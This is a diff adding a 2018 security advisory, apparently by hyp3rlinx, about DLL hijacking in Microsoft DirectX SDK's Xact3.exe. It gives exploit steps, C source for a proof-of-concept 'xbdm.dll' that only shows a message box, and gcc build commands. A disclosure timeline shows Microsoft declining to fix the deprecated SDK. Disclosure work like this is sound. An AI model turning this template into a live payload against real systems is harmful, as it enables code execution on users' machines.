@@ -1,0 +1,120 @@
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MICROSOFT-DIRECTX-SDK-XACT.EXE-TROJAN-FILE-CODE-EXECUTION.txt
+[+] ISR: Apparition Security   
+       
+ 
+***Greetz: indoushka | Eduardo***  
+
+
+Vendor
+=============
+www.microsoft.com
+
+
+Product
+===========
+Microsoft DirectX SDK (June 2010) Xact3.exe
+https://www.microsoft.com/en-us/download/details.aspx?id=6812
+
+XACT (Cross-platform audio creation tool) is an audio creation and authoring tool from Microsoft.
+It comes with a graphical interface that allows sound designers to create audio resources for games,
+that can be integrated into XNA projects, offering the game developer a convenient way of accessing these sounds.
+
+
+Vulnerability Type
+===================
+Remote Code Execution
+
+
+
+CVE Reference
+==============
+N/A
+
+
+
+Security Issue
+================
+Microsoft DirectX SDK "Xact3.exe" Cross-platform tool allows for arbitrary code execution via a Trojan horse file "xbdm.dll"
+in the current working directory, upon opening a ".xap" project file from same location. 
+The DirectX SDK deprecated but still avail for download at time of this writing ...
+
+
+
+Exploit/POC
+=============
+1) create DLL 32bit DLL named "xbdm.dll" and place on a remote share
+
+2) create an empty file with a ".xap" extension on the same share, this will open using "Xact3.exe" as its default
+
+3) open the the .xap file from the Network share then BOOM!
+
+
+#include <windows.h>
+
+/* hyp3rlinx */
+
+/*
+gcc -c -m32 xbdm.c
+gcc -shared -m32 -o xbdm.dll xbdm.o
+*/
+
+void executo(){
+	 MessageBox( 0, "3c184981367094fce3ab70efc3b44583" , "philbin " , MB_YESNO + MB_ICONQUESTION );
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved){
+	switch(fdwReason){
+		case DLL_PROCESS_ATTACH:{
+			 executo();
+			break;
+		}
+		case DLL_PROCESS_DETACH:{
+			 executo();
+			break;
+		}
+		case DLL_THREAD_ATTACH:{
+			 executo();
+			break;
+		}
+		case DLL_THREAD_DETACH:{
+			 executo();
+			break;
+		}
+	}
+	
+	return TRUE;
+}
+
+
+
+
+Network Access
+===============
+Remote
+
+
+
+Severity
+=========
+High
+
+
+
+Disclosure Timeline
+=============================
+Vendor Notification: June 7, 2018
+MSRC Case 45973 : June 13, 2018
+MSRC : "While your finding is valid, we won’t service this issue because the legacy DirectX SDK is deprecated." : August 10, 2018
+August 11, 2018 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
